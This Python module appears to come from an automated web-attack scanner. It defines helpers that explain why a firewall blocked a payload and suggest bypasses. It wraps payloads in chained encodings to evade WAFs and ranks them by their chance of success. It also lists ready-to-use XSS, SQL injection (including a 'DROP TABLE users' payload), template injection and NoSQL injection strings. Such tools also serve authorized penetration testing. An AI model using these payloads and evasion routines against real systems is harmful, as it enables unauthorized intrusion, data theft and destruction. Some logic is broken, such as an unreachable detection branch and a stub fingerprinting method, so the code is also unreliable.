"""Support types for the Adaptive Payload Engine.

Extracted from titan/ai/adaptive.py. Holds the dataclasses and
analysis/selection helpers used by AdaptivePayloadEngine:
PayloadResult, WAFProfile, TargetProfile, ResponseAnalyzer,
PayloadChainGenerator, InjectionContext, ContextAwarePayloadSelector,
and PayloadPrioritizer.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

from titan.ai.waf_profiles import (
    ERROR_DIALECT_PATTERNS,
    WAF_FINGERPRINT_PAYLOADS,
    WAF_RULE_PATTERNS,
)


@dataclass
class PayloadResult:
    """Track the result of a payload attempt."""
    payload: str
    attack_type: str
    status: int
    blocked: bool
    waf_detected: str | None = None
    error_class: str | None = None
    timestamp: float = field(default_factory=time.time)


@dataclass
class WAFProfile:
    """WAF-specific bypass rules and learned patterns."""
    name: str
    bypass_techniques: list[str] = field(default_factory=list)
    blocked_patterns: list[str] = field(default_factory=list)
    successful_bypasses: list[str] = field(default_factory=list)
    scan_count: int = 0
    block_rate: float = 0.0


@dataclass
class TargetProfile:
    """Target-specific payload preferences learned during scan."""
    url: str
    tech_stack: list[str] = field(default_factory=list)
    waf: str | None = None
    baas_type: str | None = None  # supabase, firebase, appwrite
    auth_type: str | None = None  # jwt, session, oauth, clerk
    framework: str | None = None  # react, vue, next, django, flask
    language: str | None = None   # python, javascript, php, java
    blocked_patterns: list[str] = field(default_factory=list)
    successful_patterns: list[str] = field(default_factory=list)
    error_patterns: list[str] = field(default_factory=list)


class ResponseAnalyzer:
    """Analyze responses to understand WHY payloads were blocked or succeeded."""

    # WAF rule patterns, fingerprint payloads, and dialect patterns live in
    # titan/ai/waf_profiles.py (extracted so they can be tested directly).
    # Re-exposed as class attributes to keep every ``cls.X`` call site intact.
    WAF_RULE_PATTERNS = WAF_RULE_PATTERNS
    WAF_FINGERPRINT_PAYLOADS = WAF_FINGERPRINT_PAYLOADS
    ERROR_DIALECT_PATTERNS = ERROR_DIALECT_PATTERNS

    @classmethod
    def analyze_blocked(cls, payload: str, status: int, body: str, headers: dict[str, str]) -> dict[str, Any]:
        """Analyze WHY a payload was blocked."""
        analysis: dict[str, Any] = {
            "blocked": True,
            "status": status,
            "waf_rule": None,
            "blocked_pattern": None,
            "blocked_position": None,
            "suggested_bypass": None,
        }

        body_lower = body.lower() if body else ""
        payload_lower = payload.lower()

        # Detect which WAF rule triggered
        for rule_name, keywords in cls.WAF_RULE_PATTERNS.items():
            for keyword in keywords:
                if keyword in payload_lower and keyword in body_lower:
                    analysis["waf_rule"] = rule_name
                    analysis["blocked_pattern"] = keyword
                    break

        # Detect where in the payload was blocked
        if analysis["blocked_pattern"]:
            pattern = analysis["blocked_pattern"]
            idx = payload_lower.find(pattern)
            if idx >= 0:
                analysis["blocked_position"] = {
                    "start": idx,
                    "end": idx + len(pattern),
                    "context": payload[max(0, idx-10):idx+len(pattern)+10],
                }

        # Suggest bypass based on blocked pattern
        analysis["suggested_bypass"] = cls._suggest_bypass(analysis)

        return analysis

    @classmethod
    def _suggest_bypass(cls, analysis: dict[str, Any]) -> str | None:
        """Suggest a bypass based on analysis."""
        rule = analysis.get("waf_rule")
        pattern = analysis.get("blocked_pattern")

        if rule == "sql_injection":
            if pattern in ("union", "select"):
                return "Try UNION/**/SELECT or /*!UNION*/ SELECT"
            elif pattern in ("or", "and"):
                return "Try OR/**/1=1 or &&1=1"
            elif pattern in ("--", "#"):
                return "Try /**/ or %0a"

        elif rule == "xss_injection":
            if pattern == "script":
                return "Try <img onerror or <svg onload"
            elif pattern == "alert":
                return "Try prompt() or confirm()"
            elif pattern == "javascript:":
                return "Try data:text/html or javascript%3a"

        elif rule == "path_traversal":
            if pattern == "..":
                return "Try ....// or ..%2f or %2e%2e%2f"

        elif rule == "command_injection":
            if pattern in (";", "|", "&&"):
                return "Try %0a or %0d or newline injection"

        elif rule == "ssrf":
            if "169.254" in str(pattern):
                return "Try decimal IP 2130706433 or hex 0x7f000001"

        return None

    @classmethod
    def analyze_success(cls, payload: str, status: int, body: str, headers: dict[str, str]) -> dict[str, Any]:
        """Analyze WHY a payload succeeded."""
        analysis: dict[str, Any] = {
            "blocked": False,
            "status": status,
            "dialect": None,
            "version": None,
            "data_leaked": False,
            "sensitive_data": [],
        }

        body_lower = body.lower() if body else ""

        # Detect database dialect from response
        for dialect, patterns in cls.ERROR_DIALECT_PATTERNS.items():
            for pattern in patterns:
                if pattern in body_lower:
                    analysis["dialect"] = dialect
                    break
            if analysis["dialect"]:
                break

        # Detect sensitive data
        sensitive_patterns = {
            "password": ["password", "passwd", "pwd", "pass"],
            "email": ["email", "e-mail", "mail"],
            "token": ["token", "api_key", "apikey", "secret"],
            "credit_card": ["credit", "card", "visa", "mastercard", "amex"],
            "ssn": ["ssn", "social security"],
        }

        for data_type, keywords in sensitive_patterns.items():
            for keyword in keywords:
                if keyword in body_lower:
                    analysis["sensitive_data"].append(data_type)
                    analysis["data_leaked"] = True
                    break

        return analysis

    @classmethod
    def fingerprint_waf(cls, response_func, target_url: str) -> dict[str, Any]:
        """Fingerprint the WAF by sending test payloads."""
        # This would be called with a response function
        # For now, return a basic fingerprint structure
        return {
            "detected": False,
            "name": None,
            "version": None,
            "type": None,  # free, enterprise, custom
            "rules": [],
            "bypass_strategy": None,
        }


class PayloadChainGenerator:
    """Generate multi-layer encoded payload chains."""

    @staticmethod
    def generate_chains(payload: str, max_chains: int = 10) -> list[str]:
        """Generate chained encoding payloads."""
        chains = []

        # Chain 1: URL → Base64
        import base64
        from urllib.parse import quote
        url_encoded = quote(payload, safe="")
        b64_of_url = base64.b64encode(url_encoded.encode()).decode()
        chains.append(b64_of_url)

        # Chain 2: Double URL encoding
        chains.append(quote(quote(payload, safe="")))

        # Chain 3: URL → Hex
        hex_of_url = url_encoded.encode().hex()
        chains.append(hex_of_url)

        # Chain 4: Mixed encoding per character
        mixed = ""
        for i, c in enumerate(payload):
            if i % 4 == 0:
                mixed += quote(c, safe="")
            elif i % 4 == 1:
                mixed += f"%{ord(c):02x}"
            elif i % 4 == 2:
                mixed += c.upper() if c.islower() else c.lower()
            else:
                mixed += c
        chains.append(mixed)

        # Chain 5: Unicode + URL
        unicode_payload = ""
        for c in payload:
            if ord(c) > 127:
                unicode_payload += f"%u{ord(c):04x}"
            else:
                unicode_payload += quote(c, safe="")
        chains.append(unicode_payload)

        # Chain 6: HTML entities + URL
        html_url = ""
        for c in payload:
            if ord(c) > 127:
                html_url += f"&#x{ord(c):x};"
            else:
                html_url += quote(c, safe="")
        chains.append(html_url)

        # Chain 7: Comment insertion + encoding
        comment_payload = payload.replace(" ", "/**/")
        chains.append(quote(comment_payload, safe=""))

        # Chain 8: Whitespace variation + encoding
        whitespace_payload = payload.replace(" ", "%09%0a%0d")
        chains.append(quote(whitespace_payload, safe=""))

        # Chain 9: Case toggle + encoding
        case_toggled = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        chains.append(quote(case_toggled, safe=""))

        # Chain 10: Triple encoding
        chains.append(quote(quote(quote(payload, safe=""), safe="")))

        # Deduplicate and limit
        seen = set()
        result = []
        for c in chains:
            if c not in seen and c != payload:
                seen.add(c)
                result.append(c)
            if len(result) >= max_chains:
                break

        return result


@dataclass
class InjectionContext:
    """Context of where the injection is happening."""
    location: str  # query, body, header, cookie, path
    injection_point: str  # html_attribute, js_string, sql_query, template, json_value
    content_type: str  # text/html, application/json, text/plain
    encoding: str  # utf-8, latin-1, etc.
    previous_chars: str = ""  # chars before injection point
    next_chars: str = ""  # chars after injection point


class ContextAwarePayloadSelector:
    """Select payloads based on WHERE the injection is."""

    @staticmethod
    def get_context_payloads(attack_type: str, context: InjectionContext) -> list[str]:
        """Get payloads optimized for the injection context."""
        payloads = []

        if context.injection_point == "html_attribute":
            payloads.extend(ContextAwarePayloadSelector._html_attribute_payloads(attack_type))
        elif context.injection_point == "js_string":
            payloads.extend(ContextAwarePayloadSelector._js_string_payloads(attack_type))
        elif context.injection_point == "sql_query":
            payloads.extend(ContextAwarePayloadSelector._sql_query_payloads(attack_type))
        elif context.injection_point == "template":
            payloads.extend(ContextAwarePayloadSelector._template_payloads(attack_type))
        elif context.injection_point == "json_value":
            payloads.extend(ContextAwarePayloadSelector._json_value_payloads(attack_type))

        return payloads

    @staticmethod
    def _html_attribute_payloads(attack_type: str) -> list[str]:
        if attack_type == "xss":
            return [
                '" onfocus=alert(1) autofocus="',
                "' onfocus=alert(1) autofocus='",
                '" onmouseover=alert(1) id="',
                '" onerror=alert(1) id="',
                '" onclick=alert(1) id="',
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
            ]
        return []

    @staticmethod
    def _js_string_payloads(attack_type: str) -> list[str]:
        if attack_type == "xss":
            return [
                "';alert(1);//",
                '";alert(1);//',
                "'-alert(1)-'",
                '"-alert(1)-"',
                "\\';alert(1);//",
                "\";alert(1);//",
                "`-alert(1)-`",
                "${alert(1)}",
            ]
        return []

    @staticmethod
    def _sql_query_payloads(attack_type: str) -> list[str]:
        if attack_type == "sqli":
            return [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND SLEEP(3)--",
                "' AND BENCHMARK(5000000,MD5('a'))--",
            ]
        return []

    @staticmethod
    def _template_payloads(attack_type: str) -> list[str]:
        if attack_type == "ssti":
            return [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self.__init__.__globals__}}",
            ]
        return []

    @staticmethod
    def _json_value_payloads(attack_type: str) -> list[str]:
        if attack_type == "nosqli":
            return [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$exists": true}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
            ]
        elif attack_type == "sqli":
            return [
                "' OR '1'='1",
                "1; DROP TABLE users",
                "' UNION SELECT NULL--",
            ]
        return []

    @staticmethod
    def detect_injection_point(response_body: str, param_name: str, param_value: str) -> InjectionContext:
        """Detect where the injection point is in the response."""
        context = InjectionContext(
            location="unknown",
            injection_point="unknown",
            content_type="text/html",
            encoding="utf-8",
        )

        body_lower = response_body.lower() if response_body else ""
        param_lower = param_value.lower() if param_value else ""

        # Check if value appears in HTML attribute
        if f'"{param_lower}"' in body_lower or f"'{param_lower}'" in body_lower:
            context.injection_point = "html_attribute"
            context.location = "body"

        # Check if value appears in JS string
        elif f'"{param_lower}"' in body_lower or f"'{param_lower}'" in body_lower:
            context.injection_point = "js_string"
            context.location = "body"

        # Check if value appears in SQL error
        elif any(kw in body_lower for kw in ["sql", "syntax", "mysql", "postgresql"]):
            context.injection_point = "sql_query"
            context.location = "body"

        # Check if value appears in template
        elif any(kw in body_lower for kw in ["template", "render", "jinja", "twig"]):
            context.injection_point = "template"
            context.location = "body"

        # Default to query parameter
        else:
            context.injection_point = "query"
            context.location = "query"

        return context


class PayloadPrioritizer:
    """Rank payloads by likelihood of success."""

    @staticmethod
    def prioritize(
        payloads: list[str],
        target_profile: TargetProfile | None = None,
        waf_profile: WAFProfile | None = None,
        error_dialect: str | None = None,
    ) -> list[str]:
        """Rank payloads by likelihood of success."""
        scored = []

        for payload in payloads:
            score = PayloadPrioritizer._score_payload(
                payload, target_profile, waf_profile, error_dialect
            )
            scored.append((score, payload))

        # Sort by score (highest first)
        scored.sort(key=lambda x: x[0], reverse=True)

        return [p for _, p in scored]

    @staticmethod
    def _score_payload(
        payload: str,
        target_profile: TargetProfile | None,
        waf_profile: WAFProfile | None,
        error_dialect: str | None,
    ) -> float:
        score = 0.5  # Base score

        # Boost if payload matches target's dialect
        if error_dialect:
            if (error_dialect == "mysql" and "mysql" in payload.lower()) or (error_dialect == "postgresql" and "pg_" in payload.lower()) or (error_dialect == "mssql" and "waitfor" in payload.lower()):
                score += 0.2

        # Boost if payload is short (less likely to be blocked)
        if len(payload) < 20:
            score += 0.1

        # Boost if payload uses encoding (more likely to bypass WAF)
        if any(enc in payload for enc in ["%", "&#", "/**/"]):
            score += 0.1

        # Reduce if payload was blocked before
        if waf_profile and payload in waf_profile.blocked_patterns:
            score -= 0.3

        # Boost if payload was successful before
        if waf_profile and payload in waf_profile.successful_bypasses:
            score += 0.3

        return max(0.0, min(1.0, score))


